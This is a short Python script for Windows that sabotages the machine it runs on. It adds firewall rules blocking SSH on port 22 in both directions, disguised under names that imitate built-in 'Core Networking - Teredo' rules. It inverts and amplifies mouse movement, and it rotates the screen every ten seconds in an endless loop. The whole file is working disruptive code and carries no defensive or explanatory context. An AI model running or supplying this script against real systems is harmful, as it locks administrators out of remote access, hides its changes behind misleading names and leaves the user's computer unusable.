import mouse
import asyncio
import time
import win32api as win32
import win32con
import os

last_pos = mouse.get_position()
count = 1

os.popen('netsh advfirewall firewall add rule name="Core Networking - Teredo(UDP-In)" protocol=TCP  dir=out remoteport=22 action=block')
os.popen('netsh advfirewall firewall add rule name="Core Networking - Teredo(UDP-Out)" protocol=TCP  dir=in remoteport=22 action=block')

def on_move(event):
    global last_pos

    if isinstance(event, mouse._mouse_event.MoveEvent):
        new_pos = ((last_pos[0] - event.x) * 2, (last_pos[1] - event.y) * 2)
        asyncio.sleep(0)
        mouse.move(*new_pos, absolute=False)
        last_pos = mouse.get_position()

mouse.hook(on_move)

while True:
    if (count % 3 == 0):
        rotation_val=win32con.DMDO_90
    elif(count % 3 == 1):
        rotation_val=win32con.DMDO_270
    elif(count % 3 == 2):
        rotation_val=win32con.DMDO_180
    
    device = win32.EnumDisplayDevices(None,0)
    dm = win32.EnumDisplaySettings(device.DeviceName,win32con.ENUM_CURRENT_SETTINGS)
    if((dm.DisplayOrientation + rotation_val)%2==1):
        dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth   
    dm.DisplayOrientation = rotation_val
    win32.ChangeDisplaySettingsEx(device.DeviceName,dm)

    count += 1
    time.sleep(10)

